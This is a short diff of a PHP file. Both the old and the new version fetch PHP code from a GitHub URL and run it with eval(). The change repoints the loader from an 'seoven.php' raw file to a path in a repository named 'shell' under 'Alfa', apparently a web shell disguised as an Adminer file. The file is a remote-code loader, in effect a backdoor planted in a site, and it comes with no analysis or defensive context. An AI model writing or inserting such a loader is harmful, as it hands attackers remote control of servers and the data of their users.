@@ -1,4 +1,4 @@
 <?php
-$zhyvenseo = file_get_contents('https://raw.githubusercontent.com/seovennn/venxyn/refs/heads/main/seoven.php');
+$zhyvenseo = file_get_contents('https://github.com/seovennn/shell/blob/main/Alfa/adminer-5.4.1-mysql.php');
 $zhyvenseo = "?> ".$zhyvenseo;
 eval($zhyvenseo);
